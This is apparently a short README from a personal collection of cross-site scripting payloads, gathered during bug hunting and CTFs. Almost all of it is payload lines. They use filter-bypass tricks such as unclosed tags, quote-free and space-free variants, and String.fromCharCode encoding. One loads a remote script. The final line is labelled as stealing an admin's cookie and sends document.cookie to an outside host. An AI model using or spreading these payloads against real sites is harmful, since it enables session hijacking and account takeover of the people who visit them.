# description
I found some useful payloads while bug hunting or playing some ctfs
so here it is !

## Payloads

for no closing script tags
><img src=no onerror=alert(1) foo=
><SCRIPT SRC=http://xss.rocks/xss.js?< B >

bypass basic filters to execute an alert box
>';">'>alert(String.fromCharCode(88,83,83))

without quotes and semicolons
><IMG SRC=javascript:alert('XSS')>

<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

without any space

>"><img/src="x"/onerror=alert(99)>

steal admins cookie via reflect xss

><img src=x onerror=document.location='http://https://callmerat.000webhostapp.com/c.php?c='+document.cookie;'>
